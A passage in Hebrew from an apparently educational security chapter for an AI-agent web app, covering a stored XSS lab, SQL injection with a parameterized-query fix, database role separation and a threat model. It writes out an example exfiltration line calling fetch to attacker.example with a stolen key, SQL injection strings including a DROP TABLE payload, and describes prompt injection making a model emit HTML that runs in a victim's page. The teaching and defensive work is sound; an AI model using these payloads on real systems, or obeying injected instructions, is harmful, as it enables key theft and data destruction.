בכותרת הלשונית הופיע המפתח שהדבקתם: הקוד ב-onerror רץ בתוך הדף וקרא אותו מ-sessionStorage. פעמיים בכל שליחה, כי שתי ההודעות עוברות דרך show(): ההודעה שלכם, ותשובת ה-mock שמצטטת אותה. בטעינה מחדש, loadHistory() מציג את השיחה מבסיס הנתונים דרך אותה show(), והקוד רץ שוב: הוא שמור (stored XSS), לא חד-פעמי. עם textContent הכותרת נשארת my-agent, והתגית מוצגת כטקסט: &lt;img src=x ...&gt;.

במקום document.title, תוקף היה כותב fetch("https://attacker.example/?k=" + ...) ושולח לעצמו את המפתח, או שולח בשמכם בקשות ל-/chat ול-DELETE. ואיך זה מגיע למשתמש אחר, כשכל שיחה שייכת ללקוח אחד? דרך התשובה של המודל: מי שמצליח לגרום למודל לכתוב HTML (prompt injection, למשל בתוך מסמך שהסוכן קורא) גורם לדף של הקורבן להריץ אותו. לכן גם תשובת המודל היא קלט.

(בבניית הפרק, הבדיקה נעשתה עם Edge במצב headless מול עותק זמני של הדף, שהקליד ושלח לבד. בדפדפן רגיל התוצאה זהה, ביד.)

3השאילתה הבטוחה

scripts\injection_lab.py
def find_safe(db: sqlite3.Connection, name: str) -> list[tuple[str, str]]:
    """RIGHT: the SQL text is fixed; the input travels separately, as a value (a parameter)."""
    sql = "SELECT name, private_note FROM users WHERE name = ?"
    print(f"  SQL sent: {sql}   value: {name!r}")
    return db.execute(sql, (name,)).fetchall()

"Dana": שתי הגרסאות מחזירות את השורה של דנה. "x' OR '1'='1": הלא-בטוחה מחזירה את שלוש השורות, הבטוחה [] (14.6). והשלישי:

הקלט הפך את השאילתה לשתי פקודות: חיפוש, ו-DROP TABLE. מה שהציל כאן הוא sqlite3, ש-execute שלו מסרב ליותר מפקודה אחת. זה מזל, לא הגנה: executescript, או drivers אחרים, מריצים את שתיהן, והטבלה נעלמת. הגרסה הבטוחה לא הגיעה לרוץ בהרצה הזו (הסקריפט נעצר בשגיאה); כשמריצים רק אותה, היא מחפשת משתמש ששמו הוא כל המחרוזת ומחזירה [].

agent הוא superuser: כך תמונת Postgres יוצרת את POSTGRES_USER. כלומר ה-api של היום יכול למחוק את בסיס הנתונים כולו, לקרוא קבצים מהשרת, ליצור משתמשים. agent_app קורא וכותב שורות, ולא יותר. עם DATABASE_URL=postgresql+psycopg://agent_app:app-local-only@db:5432/agent ה-api ענה 200 על הודעה (check_schema קורא את alembic_version, ומותר לו). psql בתוך ה-container לא שאל סיסמה, כי תמונת Postgres סומכת על חיבורים מקומיים; חיבור ברשת דורש אותה.

migrate נשאר עם agent, כי migration יוצרת ומשנה טבלאות, וזה מותר רק לבעלים. שני משתמשים, שני תפקידים: גם אם ה-api נפרץ, הסכמה מוגנת.

כדי שזה יעבוד על volume חדש: קובץ SQL ב-/docker-entrypoint-initdb.d (רץ רק ביצירת ה-volume), או צעד בתוך migrate שיוצר את המשתמש אם אינו קיים. וב-deploy\: סוד נוסף לסיסמה של agent_app, ושני DATABASE_URL שונים ל-api ול-migrate. לא חיברנו את זה ל-compose בפרק הזה; זה פער 3 ב-docs\security.md.

6מודל האיום של המערכת

המסמך המלא: checkpoints\chapter-14\docs\security.md. שבע טבלאות ורשימות: נכסים, נקודות כניסה, גבולות אמון, מה נעשה ב-0.14, פערים, מידע אישי, וכלים.

הפער הראשון ברשימה הוא Kafka בלי אימות. לא כי הוא הסביר ביותר (אין לו פורט במחשב), אלא כי הוא שובר את ההגנות האחרות: מי שנכנס לרשת הפנימית יכול לכתוב אירוע conversation.deleted מזויף או אירועים שמפילים את ה-worker, בלי שום מפתח. סדר אחר, שגם הוא סביר: משתמש בסיס הנתונים קודם, כי את התיקון שלו כבר ניסיתם בתרגיל 4 והוא זול.

השאלה הקשה ביותר מתוך הארבע: "מה אפשר לראות?". ההודעות עוברות לספק המודל, ללוגים לא, לגיבויים כן, ל-Kafka רק כמספרים. כדי לענות צריך לעקוב אחרי כל עותק של המידע, וזה בדיוק מה ש-14.10 מבקש.
